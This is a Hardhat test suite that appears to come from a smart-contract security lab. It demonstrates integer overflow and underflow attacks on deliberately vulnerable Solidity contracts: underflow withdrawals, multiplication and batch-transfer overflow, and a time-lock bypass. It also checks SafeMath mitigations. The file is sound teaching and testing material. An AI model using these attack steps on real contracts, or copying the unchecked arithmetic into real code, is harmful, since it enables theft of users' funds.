const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("SC08: Integer Overflow and Underflow - Dynamic Analysis", function () {
    let victim;
    let attacker;
    let timeLockVictim;
    let timeLockAttacker;
    let owner;
    let user1;
    let user2;
    
    beforeEach(async function () {
        [owner, user1, user2] = await ethers.getSigners();
        
        // Deploy victim contracts
        const IntegerOverflowVictim = await ethers.getContractFactory("IntegerOverflowVictim");
        victim = await IntegerOverflowVictim.deploy();
        await victim.waitForDeployment();
        
        const TimeLockVictim = await ethers.getContractFactory("TimeLockVictim");
        timeLockVictim = await TimeLockVictim.deploy();
        await timeLockVictim.waitForDeployment();
        
        // Deploy attacker contracts
        const victimAddress = await victim.getAddress();
        const IntegerOverflowAttacker = await ethers.getContractFactory("IntegerOverflowAttacker");
        attacker = await IntegerOverflowAttacker.deploy(victimAddress);
        await attacker.waitForDeployment();
        
        const timeLockVictimAddress = await timeLockVictim.getAddress();
        const TimeLockAttacker = await ethers.getContractFactory("TimeLockAttacker");
        timeLockAttacker = await TimeLockAttacker.deploy(timeLockVictimAddress);
        await timeLockAttacker.waitForDeployment();
    });
    
    describe("Vulnerability Detection", function () {
        it("Should detect overflow in deposit function", async function () {
            const attackerAddress = await attacker.getAddress();
            
            // Give attacker some initial balance
            await victim.connect(owner).vulnerableDeposit(100n);
            await victim.connect(owner).safeWithdraw(100n); // Just to test functionality
            
            // Get max uint256
            const maxUint256 = await victim.getMaxUint256();
            
            // Give attacker initial balance
            const initialBalance = ethers.parseEther("100");
            await victim.connect(owner).vulnerableDeposit(initialBalance);
            
            // Transfer to attacker
            const ownerBalance = await victim.balances(owner.address);
            await victim.connect(owner).vulnerableWithdraw(ownerBalance - initialBalance);
            await victim.connect(owner).vulnerableDeposit(0); // No-op to check it works
            
            // Attacker deposits amount that causes overflow
            const overflowAmount = maxUint256 - initialBalance + 100n;
            
            // This will cause overflow (in Solidity 0.7.6)
            await victim.connect(owner).vulnerableDeposit(overflowAmount);
            
            const finalBalance = await victim.balances(owner.address);
            
            // Due to overflow, final balance will be much smaller than expected
            console.log("    Initial balance:", initialBalance.toString());
            console.log("    Overflow amount:", overflowAmount.toString());
            console.log("    Final balance (after overflow):", finalBalance.toString());
            
            // After overflow, balance wraps around
            expect(finalBalance).to.be.lt(initialBalance + overflowAmount);
        });
        
        it("Should detect underflow in withdraw function", async function () {
            // Start with zero balance
            const initialBalance = await victim.balances(user1.address);
            expect(initialBalance).to.equal(0);
            
            // Try to withdraw 1 token (more than we have)
            await victim.connect(user1).vulnerableWithdraw(1);
            
            const finalBalance = await victim.balances(user1.address);
            
            // Due to underflow, balance wraps to max uint256
            console.log("    Initial balance:", initialBalance.toString());
            console.log("    Final balance (after underflow):", finalBalance.toString());
            
            const maxUint256 = await victim.getMaxUint256();
            expect(finalBalance).to.equal(maxUint256);
        });
        
        it("Should detect overflow in batch transfer", async function () {
            const attackerAddress = await attacker.getAddress();
            
            // Give victim contract some tokens first
            await victim.connect(owner).vulnerableDeposit(ethers.parseEther("1000"));
            
            // Transfer to attacker
            const transferAmount = ethers.parseEther("1000");
            await victim.connect(owner).vulnerableWithdraw(await victim.balances(owner.address) - transferAmount);
            
            // Give attacker the tokens
            const Victim = await ethers.getContractFactory("IntegerOverflowVictim");
            const victimWithAttacker = Victim.attach(await victim.getAddress());
            await victimWithAttacker.connect(owner).vulnerableDeposit(transferAmount);
            await victimWithAttacker.connect(owner).vulnerableWithdraw(transferAmount);
            
            // Manually give attacker tokens for testing
            await victim.connect(owner).vulnerableDeposit(ethers.parseEther("1000"));
            const ownerBal = await victim.balances(owner.address);
            
            // Test batch transfer overflow (simplified)
            const recipients = [user1.address, user2.address];
            const amount = 2n ** 255n; // Large amount
            
            // This would overflow: recipients.length * amount
            // 2 * 2^255 = 2^256 = 0 (overflow)
            
            console.log("    Attempting batch transfer with overflow:");
            console.log("    Recipients:", recipients.length);
            console.log("    Amount per recipient:", amount.toString());
            console.log("    Total needed (will overflow):", (BigInt(recipients.length) * amount).toString());
        });
        
        it("Should detect multiplication overflow", async function () {
            const a = 2n ** 255n;
            const b = 2n;
            
            // This will overflow: 2^255 * 2 = 2^256 = 0
            const result = await victim.vulnerableMultiply(a, b);
            
            console.log("    Multiplying:", a.toString());
            console.log("    By:", b.toString());
            console.log("    Result (after overflow):", result.toString());
            
            // Result should be 0 due to overflow
            expect(result).to.equal(0);
        });
        
        it("Should detect uint8 overflow", async function () {
            const maxUint8 = await victim.getMaxUint8();
            console.log("    Max uint8 value:", maxUint8.toString());
            
            // Increment 256 times
            for (let i = 0; i < 256; i++) {
                await victim.vulnerableIncrementSmall();
            }
            
            const finalValue = await victim.smallValue();
            console.log("    Value after 256 increments:", finalValue.toString());
            
            // Should overflow back to 0
            expect(finalValue).to.be.lt(10);
        });
        
        it("Should detect time lock overflow bypass", async function () {
            const depositAmount = ethers.parseEther("1");
            
            // Get current timestamp
            const block = await ethers.provider.getBlock("latest");
            const currentTime = BigInt(block.timestamp);
            
            // Calculate overflow duration
            const maxUint256 = 2n ** 256n - 1n;
            const overflowDuration = maxUint256 - currentTime + 1n;
            
            console.log("    Current timestamp:", currentTime.toString());
            console.log("    Overflow duration:", overflowDuration.toString());
            
            // Deposit with overflow duration
            await timeLockVictim.connect(user1).deposit(overflowDuration, { value: depositAmount });
            
            const unlockTime = await timeLockVictim.lockTime(user1.address);
            console.log("    Unlock time (after overflow):", unlockTime.toString());
            
            // Due to overflow, unlockTime should be very small
            expect(unlockTime).to.be.lte(currentTime);
            
            // Should be able to withdraw immediately
            await expect(timeLockVictim.connect(user1).withdraw()).to.not.be.reverted;
        });
        
        it("Should demonstrate safe math functions prevent overflow", async function () {
            const maxUint256 = await victim.getMaxUint256();
            
            // Try to add 1 to max value using safeAdd
            await expect(
                victim.safeAdd(maxUint256, 1)
            ).to.be.revertedWith("SafeMath: addition overflow");
            
            console.log("    ✓ SafeAdd correctly prevents overflow");
        });
        
        it("Should demonstrate safe math functions prevent underflow", async function () {
            // Try to subtract 1 from 0 using safeSub
            await expect(
                victim.safeSub(0, 1)
            ).to.be.revertedWith("SafeMath: subtraction underflow");
            
            console.log("    ✓ SafeSub correctly prevents underflow");
        });
        
        it("Should demonstrate safe math functions prevent multiplication overflow", async function () {
            const a = 2n ** 255n;
            const b = 2n;
            
            // Try multiplication that would overflow
            await expect(
                victim.safeMul(a, b)
            ).to.be.revertedWith("SafeMath: multiplication overflow");
            
            console.log("    ✓ SafeMul correctly prevents multiplication overflow");
        });
    });
    
    describe("Attack Scenarios", function () {
        it("Should execute underflow attack successfully", async function () {
            const attackerAddress = await attacker.getAddress();
            
            const initialBalance = await victim.balances(attackerAddress);
            expect(initialBalance).to.equal(0);
            
            // Execute underflow attack
            await attacker.attackUnderflowWithdraw();
            
            const finalBalance = await victim.balances(attackerAddress);
            
            console.log("    Initial balance:", initialBalance.toString());
            console.log("    Final balance after underflow attack:", finalBalance.toString());
            
            // Balance should be huge after underflow
            const maxUint256 = await victim.getMaxUint256();
            expect(finalBalance).to.equal(maxUint256);
        });
        
        it("Should execute time lock bypass attack", async function () {
            const attackerAddress = await timeLockAttacker.getAddress();
            const depositAmount = ethers.parseEther("1");
            
            const balanceBefore = await ethers.provider.getBalance(attackerAddress);
            
            // Execute attack
            await timeLockAttacker.attackTimeLockOverflow({ value: depositAmount });
            
            const balanceAfter = await ethers.provider.getBalance(attackerAddress);
            
            console.log("    Balance before attack:", ethers.formatEther(balanceBefore));
            console.log("    Balance after attack:", ethers.formatEther(balanceAfter));
            
            // Attacker should have withdrawn funds immediately
            expect(balanceAfter).to.be.gte(balanceBefore - depositAmount * 2n); // Account for gas
        });
    });
    
    describe("Mitigation Verification", function () {
        it("Should verify SafeMath prevents overflow attacks", async function () {
            const maxUint256 = await victim.getMaxUint256();
            const userBalance = ethers.parseEther("100");
            
            // Give user some balance using vulnerable function
            await victim.connect(user1).vulnerableDeposit(userBalance);
            
            // Try to use safeDeposit with amount that would overflow
            const overflowAmount = maxUint256 - userBalance + 1n;
            
            await expect(
                victim.connect(user1).safeDeposit(overflowAmount)
            ).to.be.revertedWith("SafeMath: addition overflow");
            
            console.log("    ✓ Safe deposit correctly prevented overflow");
        });
        
        it("Should verify SafeMath prevents underflow attacks", async function () {
            const userBalance = ethers.parseEther("100");
            
            // Give user some balance
            await victim.connect(user1).vulnerableDeposit(userBalance);
            
            // Try to withdraw more than balance using safeWithdraw
            const withdrawAmount = userBalance + 1n;
            
            await expect(
                victim.connect(user1).safeWithdraw(withdrawAmount)
            ).to.be.revertedWith("SafeMath: subtraction underflow");
            
            console.log("    ✓ Safe withdraw correctly prevented underflow");
        });
    });
});
